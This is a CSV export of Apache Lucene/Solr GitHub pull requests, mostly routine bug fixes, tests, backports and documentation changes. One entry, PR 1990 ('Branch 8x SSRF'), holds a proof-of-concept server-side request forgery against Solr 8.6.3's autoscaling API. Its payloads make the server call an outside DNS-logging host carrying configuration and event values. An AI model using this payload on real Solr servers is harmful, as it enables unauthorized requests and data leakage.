"","2226","LUCENE-9685: Hunspell: prefix condition is only checked on suffix, not stem","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  aff: ``` PFX h Y 1 PFX h 0 de .  SFX A Y 1 SFX A te tion/S . ``` dic: ``` hydrate/hA ``` should pass: `assertStemsTo(""dehydration"", ""hydrate"");`  # Solution  After the prefix is stripped and there's a suffix to strip, its condition flag may be present not only on the suffix, but also on the stem.  # Tests  A synthetic test based on Spanish `deshidratación`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-20T17:19:35Z","2021-01-21T12:54:04Z"
"","1822","Update french_stop.txt","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Adding the term 'ça' corresponding to the shortened form of 'that' Adding the term 'où' corresponding to ""where"" Adding the term 'elles' corresponding to the feminine form of 'they' Updating the comment for the term 'ou' corresponding to 'or' and not 'where'  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","quinzeromain","2020-09-02T20:50:18Z","2020-09-02T21:13:27Z"
"","2201","SOLR-15071: add TestEdisMaxSolrFeature.testEdisMaxSolrFeatureCustomMM() test case","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Add test for reproducing the issue SOLR-15071 # Tests  Add test for reproducing the issue SOLR-15071 # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","holysleeper","2021-01-14T06:07:29Z","2021-01-14T10:44:27Z"
"","2290","LUCENE-9723: Hunspell: update sanity tests that load all dictionaries","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `TestAllDictionaries`(2) are hard to run and their javadoc outdated, as well as the package's javadoc  # Solution  Make it a single test understanding dictionary dir format of at least two repositories, point to them in the package javadoc.  # Tests  `TestAllDictionaries` is updated (but failing for now)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-02T14:17:30Z","2021-02-03T11:02:00Z"
"","2457","LUCENE-9824: Hunspell suggestions: speed up ngram score calculation for each dictionary entry","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `ngram` is expensive (O(`N*M*M`)) but we can make it O(N) by precompiling some automatons, specialized for the case `n=3` and `weighted=false`  # Solution  Collect all substrings with length <= 3 of the misspelled word being checked against all dictionary entries, build an automaton matching them all, run it as we go along each dictionary entry, check which substrings match and add the score accordingly.  # Tests  `TestTrigramAutomaton` checks the algorithm equivalence. `TestPerformance.en_suggest` becomes ~13% faster.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-03-05T08:00:31Z","2021-03-05T15:04:42Z"
"","2193","SOLR-15025: MiniSolrCloudCluster.waitForAllNodes ignores passed timeout value","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `MiniSolrCloudCluster.waitForAllNodes` ignores passed timeout value and creates a `TimeOut` with 30 seconds.  # Solution  Pass the provided timeout value to the `TimeOut`   # Tests  ./gradlew check  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","trdillon","2021-01-10T07:45:04Z","2021-01-29T17:22:07Z"
"","2042","SOLR-14961:  ZkMaintenanceUtils.clean doesn't remove zk-nodes with same path length","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  - use ArrayList instead of TreeSet to allow multiple entries that are equal (in this case of equal length) - sort the ArrayList afterwards  # Solution  Usage of a data stucture that allows to store duplicates in terms of the comparator used.  # Tests  Added test method to SolrZkClientTest, that adds multiple nodes to zookeeper (some of equal length). Afterwards these nodes are deleted via the ZkMaintenanceUtils.clean(...) method. Then the nodes are queried again to check if all nodes that should have been deleted are gone.  # Checklist  Please review the following and check all that apply:  - [ x ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ x ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ x ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ x ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","defonion","2020-10-28T14:02:59Z","2020-11-05T10:47:59Z"
"","2300","LUCENE-9729: Hunspell: support CHECKCOMPOUNDREP flags","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  > CHECKCOMPOUNDREP  > Forbid compounding, if the (usually bad) compound word may be a non-compound word with a REP fault. Useful for languages with ‘compound friendly’ orthography.  # Solution  When a new compound word part is about to appear, check that together with the previous one they don't form a misspelled simple word. For that, first introduce `CompoundPart` class (in a separate commit for easier review) to combine this new logic with similar `CHECKCOMPOUNDPATTERN` stuff.  # Tests  `checkcompoundrep` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-04T09:50:39Z","2021-02-05T08:54:57Z"
"","2095","LUCENE-9618: Do not call IntervalIterator.nextInterval after NO_MORE_DOCS returned","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description   * In `ConjunctionIntervalIterator` check whether approximation's returned docId is NO_MORE_DOCS to avoid `nextInterval()` call after NO_MORE_DOCS is returned  * Add a test case to verify the problem is addressed  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zhaih","2020-11-23T18:58:09Z","2020-12-03T15:17:31Z"
"","2164","SOLR-15058: get the correct hostname when hostname contain '_'","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description   `Utils.getBaseUrlForNodeName` split the nodename by the first '_'  In ZK, Solr add '_solr' to the end of the hostname   # Solution  should split by the last '_'  # Tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","Sasasu","2020-12-23T08:58:46Z","2021-01-06T00:00:18Z"
"","1702","SOLR-14681 Delete JAR","* SOLR-####:   Add the ability to delete a JAR for ZK filestore.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Add the ability to delete a locally stored a distributed jar. This issue is to support my uninstall package requirement. See https://issues.apache.org/jira/browse/SOLR-14681  # Solution  PR  # Tests  I add test for changes to the package stores.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","packages,","MarcusSorealheis","2020-07-28T04:55:22Z","2020-08-01T01:14:03Z"
"","2256","LUCENE-9507 Custom order for leaves in IndexReader and IndexWriter","1. Add an option to supply a custom leaf sorter for IndexWriter. A DirectoryReader opened from this IndexWriter will have its leaf readers sorted with the provided leaf sorter. This is useful for indices on which it is expected to run many queries with particular sort criteria (e.g. for time-based indices this is usually a descending sort on timestamp). Providing leafSorter allows to speed up early termination for this particular type of sort queries.  2. Add an option to supply a custom leaf sorter for StandardDirectoryReader. The leaf readers of this StandardDirectoryReader will be sorted according the the provided leaf sorter.","closed","","mayya-sharipova","2021-01-27T21:17:58Z","2021-03-22T16:02:32Z"
"","2519","Small edits for release process","- update Lucene wiki for release process - add advice to look for PMC help for bulk update of JIRA issues","closed","","mayya-sharipova","2021-06-24T20:51:54Z","2021-06-25T18:54:15Z"
"","2476","SOLR-15303 Sort core dropdown on admin index page","- sort the core dropdown on admin index page by core name","closed","","costalopes71","2021-03-31T04:53:04Z","2021-03-31T05:00:05Z"
"","1856","LUCENE-9449 Skip docs with _doc sort and ""after"" (#1725)","- Enhance DocComparator to provide an iterator over competitive documents when searching with ""after"". This iterator can quickly position on the desired ""after"" document skipping all documents and segments before ""after"".  - Redesign numeric comparators to provide skipping functionality by default.  Backport for #LUCENE-9449","closed","","mayya-sharipova","2020-09-10T19:04:24Z","2020-09-17T15:46:13Z"
"","1699","SOLR-13169 Improve docs for MOVEREPLICA","- document additional existing parameters, second pass fixing spelling and other details.  (cherry picked from commit b00d747eb6a94ab5775258b032e621f998ec44ba)  SOLR-13169 Improve docs for MOVEREPLICA - better parity with ref guide for v2 api descriptions  (cherry picked from commit 396490b65ca1af6ff1f1157a9896c9528c234eea)","closed","","gus-asf","2020-07-27T20:29:54Z","2020-07-27T20:37:06Z"
"","1698","SOLR-13169 Improve docs for MOVEREPLICA","- document additional existing parameters, second pass fixing spelling and other details.  (cherry picked from commit b00d747eb6a94ab5775258b032e621f998ec44ba)  SOLR-13169 Improve docs for MOVEREPLICA - better parity with ref guide for v2 api descriptions  (cherry picked from commit 396490b65ca1af6ff1f1157a9896c9528c234eea)","closed","","gus-asf","2020-07-27T20:23:00Z","2020-07-27T20:38:51Z"
"","1763","Additions to releaseWizard","- Backporting the DOA changes to the stable branch and release branch - Adding link to Solr Upgrade Notes in release notes","closed","","HoustonPutman","2020-08-19T17:46:53Z","2020-08-24T13:49:32Z"
"","1990","Branch 8x SSRF","**solr-8.6.3 SSRF**  # 0x01 URL: http://localhost:8983/solr/admin/autoscaling POST: ``` {'set-listener': {'afterAction': ['execute_plan'],                   'class': 'solr.HttpTriggerListener',                   'header.X-Trigger': '${config.trigger}',                   'name': 'test-to-flask',                   'stage': ['ABORTED', 'SUCCEEDED', 'FAILED'],                   'trigger': 'new2',                   'url': 'http://mzen63.dnslog.cn/${config.name:invalidName}/${config.trigger}/${event.id}?STAGE=${stage}'} } ``` # 0x02 URL: http://localhost:8983/solr/admin/autoscaling ``` {""set-trigger"":     {  'event': 'scheduled',  'startTime':'NOW',  'every':'',  'name': 'new2',  'waitFor': '1s'} } ```  ![image](https://user-images.githubusercontent.com/43438410/96217209-b29b8a80-0fb4-11eb-935c-c3e3f24bb04c.png)","closed","","zhzhdoai","2020-10-16T05:37:56Z","2020-10-16T08:11:09Z"
"","2135","SOLR-15038: Add elevateDocsWithoutMatchingQ and onlyElevatedReprese…","**Same PR like https://github.com/apache/lucene-solr/pull/2134 but this if for Solr 8.**  We've worked a lot with Query Elevation component in the last time and we were missing two features:  Elevate only documents that are part of the search result In combination with collapsing: Only show the representative if the elevated documents does have the same collapse field value. Because of this, we've added these two feature toggles elevateDocsWithoutMatchingQ and onlyElevatedRepresentative.","closed","","tkaessmann","2020-12-09T15:39:04Z","2021-02-12T15:57:32Z"
"","1900","SOLR-14036: Remove explicit distrib=false from /terms handler","* This removes shards, shards.qt, and shard whitelisting checks from TermsComponent. Similar to other components, this check will be done in HttpShardHandler","closed","","munendrasn","2020-09-21T16:57:00Z","2020-09-24T16:42:29Z"
"","2029","SOLR-14946: fix responseHeader returned in resp with omitHeader=true","* This occurs when BinaryResponseWriter#getParsedResponse is called as   it doesn't check for omitHeader.","closed","","munendrasn","2020-10-26T07:12:02Z","2020-10-30T13:20:22Z"
"","1672","SOLR-14651: Metrics History could disable better","* SolrRrdBackendFactory should not be created if history is disabled * Disable MetricsHistoryHandler by default in tests * Await shutdown of all executors  Interestingly, all tests passed with the history handler disabled.  Isn't that a problem @sigram ?  Somewhat related: I'm also inclined to make a little refactor in CoreContainer.shutdown such that `IOUtils.closeQuietly(metricsHistoryHandler.getSolrClient());` can move _into_ metricsHistoryHandler.close()","closed","","dsmiley","2020-07-15T16:12:07Z","2020-07-28T20:46:28Z"
"","2612","SOLR-15804 Allow content-types with ;charset in ShowFileRequestHandler","* Request .html as text/xml, .css as text/plain and .js as application/javascript * Highlight css as txt (crashed browser) * Set extension to 'xml' for managed-schema instead of 'text/xml'","closed","","janhoy","2021-11-18T11:26:04Z","2021-11-18T11:49:57Z"
"","2071","LUCENE-9322: Some fixes to SimpleTextVectorFormat.","* Make sure the files are unique by renaming the term vectors extension to `tvc`. * Fix a bug where reading a vector would drop the leading digit of the first element.","closed","","jtibshirani","2020-11-10T01:16:32Z","2020-11-10T16:02:35Z"
"","2506","LUCENE-9962, LUCENE-9944, LUCENE-9988: DrillSideways improvement backports","* LUCENE-9962: Allow DrillSideways sub-classes to provide their own ""drill down"" facet counting implementation (or null) * LUCENE-9944: Allow DrillSideways users to pass a CollectorManager without requiring an ExecutorService (and concurrent DrillSideways approach) * LUCENE-9988: Fix DrillSideways bug discovered in randomized testing  Grouped these three changes together since 9944 relies on 9962, and 9988 just fixes a bug introduced in 9944. All three of these are backports from `lucene/main`.","closed","","gsmiller","2021-06-07T18:47:54Z","2021-06-24T13:30:17Z"
"","1975","Include missing commands in package tool help section","* Include add-key and uninstall commands  > As this is a minor change, I haven't created a JIRA, will create one if required","closed","","munendrasn","2020-10-12T14:07:06Z","2020-10-14T16:41:59Z"
"","1855","SOLR-14439 -- upgrade to Tika 1.24.1","* https://issues.apache.org/jira/projects/SOLR/issues/SOLR-14439  * SOLR-14439: Upgrade to Tika 1.24.1    # Description  Upgrade to Tika 1.24.1.  # Solution  See description.  # Tests  Existing unit tests pass, and I confirmed via integration tests with DIH and the ExtractingRequesthandler on Tika's ~700 unit test files that there are no surprises.  Manual integration test code is available here: https://github.com/tballison/tika-addons/tree/main/solr-tika-integration   # Checklist This patch is against branch_8x.  Mercifully, Tika has been removed from master.  `ant precommit` is successful as is `ant test`.","closed","","tballison","2020-09-10T17:01:31Z","2020-09-11T12:54:07Z"
"","1704","Found that asciidoctor 1.5.6.2 cause build-site to fail on long anchors (#1700)","* Found that asciidoctor 1.5.6.2 cause build-site to fail on long anchors, 2.0.10 definitely works. * Clarity on when an upgrade is required, also fix obsolete wording from when PDFs were generated.","closed","","gus-asf","2020-07-28T21:08:51Z","2020-07-30T00:17:53Z"
"","2662","SOLR-16215 Escape query characters in Solr SQL Array UDF functions","* Backport of https://github.com/apache/solr/pull/879","closed","","kiranchitturi","2022-05-25T22:32:12Z","2022-05-26T15:16:07Z"
"","1732","Clean up many small fixes","* Abstract classes don't need public constructors since they can only be   called by subclasses * Don't escape html characters in `@code` tags in javadoc * Fixed a few int/long arithmetic * Use Arrays.toString instead of implicit byte[].toString","closed","","madrob","2020-08-10T18:42:20Z","2020-09-08T15:27:58Z"
"","2509","Fix 8.9.0 < 8.10.0 comparison in smokeTestRelease.py script.","(Please note this pull request is for `lucene-solr/branch_8_9` branch and after merge the changes would have to be cherry-picked to `lucene-solr/branch_8x` branch and (I'm guessing) also `lucene/main` and `solr/main` branches.)  ### Existing (broken) behaviour  As part of the 8.9.0 release process @mayya-sharipova reported on the [dev@lucene](https://lists.apache.org/thread.html/rc81568f9006701fb72f9f82f17b89e1be94d3f2a5595ff78186f3b69%40%3Cdev.lucene.apache.org%3E) list that smokeTestRelease.py fails:  > I've also looked at the failure on 8.x branch: ""Future release 8.9.0 is greater than 8.10.0"", and it looks like smokeTestRelease.py fails to correctly compare v8.10.0 > v8.9.0, as (('8', '10', '0') < ('8', '9', '0')).  ### Local testing  #### Script ``` $ cat ./versionToTuple_test.py #!/usr/bin/env python3  import re  reVersion = re.compile(r'(\d+)\.(\d+)(?:\.(\d+))?\s*(-alpha|-beta|final|RC\d+)?\s*(?:\[.*\])?', re.IGNORECASE)  priorVersionTuple1 = None priorVersionTuple2 = None for version in [ ""4.0.0-beta"", ""8.9.0"", ""8.10.0"" ]:   versionMatch = reVersion.match(version)   versionTuple = versionMatch.groups()    if priorVersionTuple1 is not None:     print(""before: ({} < {}) evaluates to {}"".format(priorVersionTuple1, versionTuple, (priorVersionTuple1 < versionTuple)))   priorVersionTuple1 = versionTuple    versionTuple = tuple(int(x) if x is not None and x.isnumeric() else x for x in versionTuple)    if priorVersionTuple2 is not None:     print("" after: ({} < {}) evaluates to {}"".format(priorVersionTuple2, versionTuple, (priorVersionTuple2 < versionTuple)))   priorVersionTuple2 = versionTuple ```  #### Output  ``` $ ./versionToTuple_test.py before: (('4', '0', '0', '-beta') < ('8', '9', '0', None)) evaluates to True  after: ((4, 0, 0, '-beta') < (8, 9, 0, None)) evaluates to True before: (('8', '9', '0', None) < ('8', '10', '0', None)) evaluates to False  after: ((8, 9, 0, None) < (8, 10, 0, None)) evaluates to True ```","closed","","cpoerschke","2021-06-08T08:08:45Z","2021-06-08T14:59:57Z"
"","2655","SOLR-16143 SolrConfig ResourceProvider can miss updates from ZooKeeper","(cherry picked from commit 3ed851fc84015f092271ccf8f93c1d20737804ca)","closed","","madrob","2022-05-16T18:38:24Z","2022-05-18T17:46:26Z"
"","2642","SOLR-16019 Query parsing exception return HTTP 400 instead of 500","(Back-ported from https://github.com/apache/solr/commit/cb49a7d855e222dfebe373a0c0dfa7c95989ea8e)  https://issues.apache.org/jira/browse/SOLR-16019","closed","","janhoy","2022-02-21T14:11:57Z","2022-05-18T11:24:00Z"
"","1863","SOLR-14701: GuessSchemaFields URP to replace AddSchemaFields URP in schemaless mode","#Description  New URP with tests. Everything is based on AddSchemaFieldsUpdateProcessorFactory but is sufficiently different to be a separate entry for backward compatibility.  # Solution  This solves the problem with original solution by: - splitting accumulation of information about data seen (in processAdd) and actual schema modification (in commit) - it uses parameter flag instead of disabling the whole chain, which causes problems if you do want to parse dates - it supports parameter widening for numeric types to achieve sane results (e.g. Integer promoted to Double) - It tracks multiplicity of values, so allows the baseline fieldTypes to be single-valued and fields declare multiValued as appropriate  It removes - Sub-selecting which fields this process applies to. Mostly because we are now much more explicit about it being a learning schema. But also because nobody seems to be using that. Nor was it tested. - Default options. They were interactive in non-predictable ways and the only sane option is mapping for String type anyway.   Not in this PR  - RefGuide  - New Examples - Change file notice They should be done together in a separate Jira, as they may need additional discussion.  # Tests The existing schemaless tests were copied and adjusted to work with new limitations. A couple more tests could be added later to test better for multiplicity (already tested with xpath), but also to test type widening more directly.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [-] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","arafalov","2020-09-13T03:33:04Z","2020-09-25T13:37:59Z"
"","2567","LUCENE-9662: CheckIndex should be concurrent (backporting)","### Description Backporting changes from the following commits: 1. ""CheckIndex should be concurrent - parallelizing index check across segments"": https://github.com/apache/lucene/commit/424192e1704664dc0ebc55109feaad5990b945cb 1. ""fix test failure from merging away soft-deletes"": https://github.com/apache/lucene/commit/34232430f200a0941de683d9035e08a4cbec9df4  Note: Commit ""Update concurrent index checking usage instructions"" in https://github.com/apache/lucene/pull/281 will also be added later once it was approved and merged.  ### Merge conflict resolution As the CheckIndex changes were added on top of a few changes only intended for 9.0 release / not backported to 8x, there were some merge conflicts in `CheckIndex` during the backporting and I have handled them as such: 1. Removed KNN vector checking code 2. Used `FutureArrays` instead of `Arrays` (the change was introduced in https://github.com/apache/lucene/commit/faaee86efb01fa6e431fcb129cfb956c7d62d514#diff-5f58f7980802006ec5dcfaa58cdfa6b218bfca46d8f317dcca3a1c5881b80c64)","closed","","zacharymorn","2021-09-08T05:57:46Z","2021-09-10T16:30:38Z"
"","2517","Backport LUCENE-9142 and LUCENE-9983","### Changes Cherry-picked LUCENE-9142 and LUCENE-9983 change  LUCENE-9142 is a refactoring change that LUCENE-9983 depending on  LUCENE-9983 is a change that speeds up `determinize` process when large amount of states are created.  ### Test `ant precommit` && unit tests for lucene-core","closed","","zhaih","2021-06-23T20:23:06Z","2021-06-23T23:20:22Z"
"","2259","SOLR-15114: WAND does not work correctly on multiple segments in Solr 8.6.3","## Description  In Solr 8.6.3, minCompetitiveScore of WANDScorer resets to zero for each index segment and remain zero until maxScore is updated. There are two causes of this problem:  - MaxScoreCollector does not set minCompetitiveScore of MinCompetitiveScoreAwareScorable newly generated for another index segment. - MaxScoreCollector updates minCompetitiveScore only if maxScore is updated. This behavior is correct considering the purpose of MaxScoreCollector.  For details, see the attached pdf https://issues.apache.org/jira/secure/attachment/13019548/wand.pdf.  Fixed https://issues.apache.org/jira/browse/SOLR-15114","closed","","chlorochrule","2021-01-28T07:46:11Z","2021-02-12T01:16:22Z"
"","2342","LUCENE-9406: Add IndexWriterEventListener to track events in IndexWriter","# Description / Solution  Add IndexWriterEventListener interface to track events in IndexWriter  # Tests * Passed existing tests * Added an additional test  Note: precommit is currently failing due to nocommit comment  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2021-02-10T09:02:22Z","2021-03-05T04:35:28Z"
"","2068","LUCENE-8982: Separate out native code to another module to allow cpp build with gradle","# Description When working on https://issues.apache.org/jira/browse/LUCENE-8982, we realized that there may no longer be a way to build native cpp code due to migration away from ant. This patch separate out native code to another module to allow cpp build with gradle.  # Solution Create a new lucene module and new parameter `-Pbuild.native=true` for cpp code compilation.  # Tests Pending  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-11-07T06:52:46Z","2020-11-16T08:40:31Z"
"","2134","SOLR-15038: Add elevateDocsWithoutMatchingQ and onlyElevatedReprese…","# Description We've worked a lot with Query Elevation component in the last time and we have missed the following features:  * Elevate only documents that are part of the search result * In combination with collapsing: Only show the representative if the elevated documents does have the same collapse field value.  # Solution  We've added these two features as toggles: elevateDocsWithoutMatchingQ and onlyElevatedRepresentative.  # Tests  Added the tests that test exactly these two features.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","tkaessmann","2020-12-09T15:26:36Z","2021-02-17T10:01:43Z"
